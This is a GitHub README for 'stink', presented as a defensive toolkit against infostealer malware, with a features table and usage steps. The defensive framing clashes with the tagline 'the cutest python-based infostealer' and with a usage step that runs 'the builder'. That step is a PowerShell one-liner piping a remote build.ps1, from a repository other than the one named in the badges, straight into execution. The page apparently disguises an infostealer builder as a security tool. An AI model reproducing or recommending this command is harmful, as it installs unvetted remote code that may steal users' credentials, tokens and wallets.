<div align="center">

<img src=".github/.stink-logo.png" alt="stink" width="400">

### the cutest python-based infostealer practical defense & detection toolkit

![python 3.16](https://shieldcn.dev/badge/python%203.16.svg?variant=outline&logo=ri%3AFaPython&size=xs)
![Commits](https://www.shieldcn.dev/github/commits/vanitoo/stink.svg?variant=outline&size=xs)
![license MIT](https://shieldcn.dev/badge/license-MIT-green.svg?variant=outline&size=xs)
![beta](https://shieldcn.dev/badge/status-beta-blue.svg?variant=outline&size=xs)


**detect, analyze, and defend against infostealer malware** — built for security practitioners, blue teamers, and incident responders.

[about](#-about) · [features](#-features) · [usage](#-usage)

---

</div>

## <img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Telegram-Animated-Emojis/main/Objects/Memo.webp" alt="📝" width="25" height="25" /> about

**stink** is an open-source, python-native toolkit designed to help defenders detect, analyze, and respond to infostealer campaigns. infostealers (redline, vidar, raccoon, lumma, etc.) are among the most prevalent threats targeting credentials, session tokens, crypto wallets, and browser data.

this toolkit provides:
- **real-time behavioral detection** of infostealer activity on live systems
- **artifact analysis** for forensic triage of compromised hosts
- **ioc extraction** from captured samples or memory
- **defense hardening** scripts to reduce your attack surface
- **yara rule integration** for signature-based detection
- **siem-ready output** in json/cef for log pipeline ingestion

---

## <img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Telegram-Animated-Emojis/main/Animals%20and%20Nature/Fire.webp" alt="🔥" width="25" height="25" /> features

| category | capability |
|---|---|
| 🔎 **detection** | process hollowing detection, suspicious api call monitoring, credential access hooks |
| 🧠 **analysis** | static + dynamic artifact parsing, string extraction, network ioc identification |
| 🛡️ **defense** | browser credential store hardening, lsa protection checks, token theft mitigations |
| 📊 **reporting** | json, cef, stix 2.1 output; mitre att&ck technique tagging |
| 🔗 **integrations** | virustotal, malwarebazaar, misp, sigma rule export |
| ⚙️ **automation** | cli-first, scriptable, ci/cd-friendly |

---

## <img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Telegram-Animated-Emojis/main/Objects/Laptop.webp" alt="💻" width="25" height="25" /> usage
### powershell
fastest way to get the builder running, automatically gets all missing dependencies
```
irm https://raw.githubusercontent.com/FallenAstaroth/stink/refs/heads/main/build.ps1 | iex
```
### manual
```
git clone github.com/FallenAstaroth/stink
cd stink
python ./build.py
```

---

<div align="center">

distributed under [mit](license). &nbsp;&middot;&nbsp; made with <3 for defenders. &nbsp;&middot;&nbsp; helped you? star the repo!

*misuse against systems without authorization is illegal and unethical. the authors assume no liability for misuse.*

</div>
